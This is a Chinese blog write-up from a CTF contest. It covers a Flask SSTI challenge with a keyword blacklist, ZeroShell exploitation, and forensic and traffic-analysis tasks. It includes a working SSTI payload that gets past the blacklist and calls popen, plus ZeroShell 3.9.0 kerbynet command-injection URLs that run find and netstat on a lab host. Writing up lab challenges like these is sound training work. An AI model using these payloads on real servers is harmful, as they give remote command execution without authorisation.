---
title: "第二届“长城杯”铁三赛小组WP（解题量少警告）"
date: 2024-12-15 22:13:00
categories:
  - "Forensics Writeup"
tags:
  - "Forensics"
  - "Writeup"
  - "长城杯"
cnblogs_postid: "18608648"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18608648"
---

## 三、解题过程

### 1、Web安全

#### Safe_Proxy

##### 操作内容：
网页源代码为Python

```Python
from flask import Flask, request, render_template_string
import socket
import threading
import html

app = Flask(__name__)

@app.route('/', methods=["GET"])
def source():
    with open(__file__, 'r', encoding='utf-8') as f:
        return '<pre>'+html.escape(f.read())+'</pre>'

@app.route('/', methods=["POST"])
def template():
    template_code = request.form.get("code")
    # 安全过滤
    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
    for black in blacklist:
        if black in template_code:
            return "Forbidden content detected!"
    result = render_template_string(template_code)
    print(result)
    return 'ok' if result is not None else 'error'

class HTTPProxyHandler:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

    def handle_request(self, client_socket):
        try:
            request_data = b""
            while True:
                chunk = client_socket.recv(4096)
                request_data += chunk
                if len(chunk) < 4096:
                    break

            if not request_data:
                client_socket.close()
                return

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
                proxy_socket.connect((self.target_host, self.target_port))
                proxy_socket.sendall(request_data)

                response_data = b""
                while True:
                    chunk = proxy_socket.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk

            header_end = response_data.rfind(b"\r\n\r\n")
            if header_end != -1:
                body = response_data[header_end + 4:]
            else:
                body = response_data
                
            response_body = body
            response = b"HTTP/1.1 200 OK\r\n" \
                       b"Content-Length: " + str(len(response_body)).encode() + b"\r\n" \
                       b"Content-Type: text/html; charset=utf-8\r\n" \
                       b"\r\n" + response_body

            client_socket.sendall(response)
        except Exception as e:
            print(f"Proxy Error: {e}")
        finally:
            client_socket.close()

def start_proxy_server(host, port, target_host, target_port):
    proxy_handler = HTTPProxyHandler(target_host, target_port)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(100)
    print(f"Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection from {addr}")
            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("Shutting down proxy server...")
    finally:
        server_socket.close()

def run_flask_app():
    app.run(debug=False, host='127.0.0.1', port=5000)

if __name__ == "__main__":
    proxy_host = "0.0.0.0"
    proxy_port = 5001
    target_host = "127.0.0.1"
    target_port = 5000

    # 安全反代，防止针对响应头的攻击
    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
    proxy_thread.daemon = True
    proxy_thread.start()

    print("Starting Flask app...")
    run_flask_app()

```

存在render_template_string()为Flask两个模版渲染函数之一，看到这个函数就知道可以可以执行xss和ssti漏洞，xss能得到的信息较少，优先考虑ssti漏洞，表达式用&#123;&#123; &#125;&#125;包围，语句用&#123;% %&#125;包围
其中存在过滤，__用*2绕过，其他的import和popen拼接绕过即可，post传上去之后还要访问一下app.py,得到注入语句：

```
code={%set gl='_'*2+'globals'+'_'*2%}{%set bu='_'*2+'builtins'+'_'*2%}{%set im='_'*2+'i"mport'+'_'*2%}{%set ax='so'[::-1]%}{{cycler.next[gl][bu][im](ax)['p"open']('cat /flag>app.py').read()}}
```

url编码后返回ok
再刷新一下靶场就可以得到flag
![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215201556075-2096553588.png)
##### flag值：
flag{c1ecdf19-9f3a-4dc8-9eca-826b88d73311}


### 2、威胁检测与网络流量分析

#### ①Zeroshell_1

##### 操作内容：

对文件进行明文分析，因为Zmxh是flag进行base64编码的结果，因此发现了base64编码

```Referer: ZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9```

解base64获得flag

##### flag值：

flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}

#### ②Zeroshell_2

##### 操作内容：

首先按照题目要求配置好虚拟机

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194629540-1633984261.png)


然后是zeroshell，在网上查询可以得知zeroshell存在漏洞

[漏洞复现 ZeroShell 3.9.0 远程命令执行漏洞 | CN-SEC 中文网](https://cn-sec.com/archives/1434996.html)

在ip地址后加````/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A{命令}%0A%27````就可以执行命令，因此执行

首先全局搜索flag文件

```
http://61.139.2.100/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509view&User=%s&x509type=%27%0Afind%20/%20-name%20flag%0A%27
```

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194642855-1260064900.png)


然后cat flag

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194648052-1870645778.png)


##### flag值：

flag{c6045425-6e6e-41d0-be09-95682a4f65c4

#### ③Zeroshell_3

##### 操作内容：

输入```http://61.139.2.100/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509view&User=%s&x509type=%27%0Anetstat%0A%27```执行命令

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194655952-1749538777.png)

筛选出非本地ip地址有61.139.2.100`、`202.115.89.103，经过测试确定ip为202.115.89.103

##### flag值：

flag{202.115.89.103}

#### ④WinFT_1

##### 操作内容：

根据电脑桌面上的工具1获得ip地址

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194712890-152535757.png)


![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194716778-329511584.png)


##### flag值：

flag{miscsecure.com:192.168.116.130:443}

#### ⑤WinFT_2

##### 操作内容：

题目里有提示是启动项中，使用桌面上的工具7查找，在计划任务中发现flag

![image-20241215193615458](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20241215193615458.png)

CyberChef解码

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194738829-1041787205.png)


##### flag值：

flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}

#### ⑥sc05_1

##### 操作内容：

在日志里查找134.6.4.12，发现在tcp流里的最早

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194743569-371465269.png)


32位大写md5加密

![image](/assets/cnblogs/第二届“长城杯”铁三赛小组WP（解题量少警告）/3539156-20241215194748545-1735727458.png)


##### flag值：

flag{01DF5BC2388E287D4CC8F11EA4D31929}
